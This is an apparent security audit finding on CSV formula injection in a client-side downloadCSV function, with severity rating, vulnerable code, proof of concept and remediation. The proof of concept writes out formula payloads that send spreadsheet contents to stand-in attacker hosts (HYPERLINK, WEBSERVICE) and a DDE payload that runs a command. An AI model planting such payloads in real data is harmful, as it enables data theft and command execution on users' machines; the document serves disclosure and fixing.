# Finding: CSV Injection in Client-Side downloadCSV

## Severity
MEDIUM (impact limited)

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N = 4.5 (the impact is limited because the CSV is downloaded by the same user who exported their own data; the attacker would need to control a value that the user exports, which is typically user-supplied data the user already controls).

## Affected Code
- File: `lib/utils/csv.ts`
- Line: 14-33 (the `data.map(...)` body — joins columns with `,` and wraps the cell in `"..."` only when `value.includes(",")`)
- Function: `downloadCSV`
- Endpoint: n/a — client-side utility called from various React components

## Description
The function joins columns with `,` (line 19) and wraps the cell in `"..."` only when `value.includes(",")` (line 26-27). Newlines (`\n`, `\r`), double quotes (`"`), leading `+`, `=`, `-`, `@`, `\t` and `\0` are not handled. A document named `=HYPERLINK("https://evil.example/?leak=" & A1, "Click for preview")` and downloaded by a sales rep opens to a working phishing link when re-opened in Excel.

Unlike the **server-side** `escapeCsvField` in `lib/trigger/export-visits.ts:14-33` (which DOES handle commas / newlines / quotes / CR and returns the literal string "NaN" for nullish values), this client helper has no defense.

## Proof of Concept

### Pre-conditions
- The attacker controls a value that the user exports. Typical surfaces:
  - The user's own document name (the user renames their own document with a formula prefix)
  - A dataroom viewer's email (if the user exports a viewer list)
  - A team member's name (if the user exports a member list)
  - Note: in the typical flow, the user controls the data they export, so the attack is mostly self-inflicted. The chain with F-021/F-022 (server-side CSV exports) is the higher-impact version.

### Step-by-step exploitation
1. Attacker (or the user themselves) renames a document to `=HYPERLINK("https://attacker.com/?leak="&A1, "Click for preview")`.
2. The user exports the document list using `downloadCSV` (e.g. from a `Download CSV` button in the dashboard).
3. The user opens the CSV in Excel.
4. The cell with the document name is rendered as a hyperlink to `https://attacker.com/?leak=<cell_value>`. The user clicks, the attacker receives the contents of cell A1 (or any cell referenced in the formula).
5. Alternative: `=WEBSERVICE("https://attacker.com/?c="&A1)` — Excel fetches the URL on open and the attacker receives the spreadsheet contents.
6. Alternative: `=cmd|'/c calc.exe'!A1` — older Excel versions execute the command directly (DDE).

## Impact
- **Self-inflicted CSV injection** — the user is the one exporting their own data, so the attacker would need to control a value in the user's exported data.
- **Cross-tenant pivot** — if the user's data includes values from other users (e.g. team member names, viewer emails), the attacker can plant a payload in a team member's name (via F-024 welcomeMessage or F-025 Agreement.name) and have the user trigger the export.
- **Lower impact than F-021/F-022** because the export is client-side and the user explicitly initiates it. The server-side exports (F-021 dataroom index, F-022 team-conversations Q&A) have higher impact because the export is server-rendered and may include attacker-controlled values that the team admin reviews.

## Evidence
```ts
// lib/utils/csv.ts:14-33
const csvContent = [
  // Headers row
  headers.join(","),
  // Data rows
  ...data.map((row) =>
    headers
      .map((header) => {
        const value = row[header];
        // Handle special cases
        if (value instanceof Date) {
          return value.toISOString();
        }
        if (typeof value === "string" && value.includes(",")) {
          return `"${value}"`;
        }
        return value;     // ← raw value goes straight into the CSV
      })
      .join(","),
  ),
].join("\n");
```

## Methodology
- **M2 — Encoding analysis** (`methodology-raw/01-encoding-analysis.md` Finding 1)

## Chain Potential
- **Chain 8** (`methodology-raw/05-chains.md`) — the lower-impact leg of the CSV injection chain. The server-side exports (F-021/F-022) are the higher-impact legs.

## Remediation
Reuse `escapeCsvField` from `lib/trigger/export-visits.ts` (or extract it into `lib/utils/csv.ts` and have both sites import it). Also prepend `'` (single-quote / apostrophe) to any cell beginning with `=`, `+`, `-`, `@`, `\t`, or `\r` so Excel/LibreOffice/Google Sheets do not interpret the cell as a formula:
```ts
// lib/utils/csv.ts (new shared helper)
export function escapeCsvField(value: unknown): string {
  if (value == null) return "";
  let str = String(value);
  // RFC 4180: wrap in quotes if contains comma, newline, or quote
  if (/[",\n\r]/.test(str)) {
    str = `"${str.replace(/"/g, '""')}"`;
  }
  // Formula injection guard: prefix with apostrophe if starts with =, +, -, @, \t, \r
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `"'${str}"`;  // wrap in quotes to preserve the apostrophe
  }
  return str;
}
```

Apply to `downloadCSV`, the dataroom index CSV (F-021), and the conversations export (F-022).
